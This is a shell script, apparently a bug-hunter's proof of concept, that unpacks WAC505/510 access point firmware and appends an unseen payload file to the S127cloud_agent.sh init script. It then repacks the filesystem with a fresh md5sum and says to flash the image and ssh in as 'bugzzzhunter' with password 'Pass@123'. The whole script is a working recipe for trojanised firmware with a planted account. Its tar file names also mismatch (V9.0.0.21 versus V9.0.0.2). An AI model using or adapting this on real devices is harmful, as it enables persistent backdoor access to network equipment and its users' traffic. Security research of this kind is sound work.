#!/bin/bash

unzip WAC505-510_firmware_V9.0.0.21.zip -d unzipped
cd unzipped
tar xvf WAC505-510_V9.0.0.21_firmware.tar
ubireader_extract_images wac5xx-ubifs-root.img
cd ubifs-root/wac5xx-ubifs-root.img/
unsquashfs img-1198823755_vol-ubi_rootfs.ubifs
cd squashfs-root/etc/init.d

echo -e "\e[1;31m*****************************************************************"
echo '             Making necessary modifications to the file              '
echo -e '*****************************************************************\e[0m'

cat ../../../../../../root_magic.txt >> S127cloud_agent.sh

cd ../../../

rm img-1198823755_vol-ubi_rootfs.ubifs
mksquashfs squashfs-root img-1198823755_vol-ubi_rootfs.ubifs -comp xz
ubinize -m 2048 -p 131072 -o wac5xx-ubifs-root.img -v ../../../ubi.ini 
mv wac5xx-ubifs-root.img ../../
cd ../../
md5sum wac5xx-ubifs-root.img > wac5xx-ubifs-root.md5sum 
rm ../WAC505-510_V9.0.0.2_firmware.tar
tar -cf ../WAC505-510_V9.0.0.2_firmware.tar wac5xx-ubifs-root.img metadata.txt version wac5xx-ubifs-root.md5sum 

echo -e "\e[1;44mUpload this firmware and ssh as user bugzzzhunter with password Pass@123\e[0m"
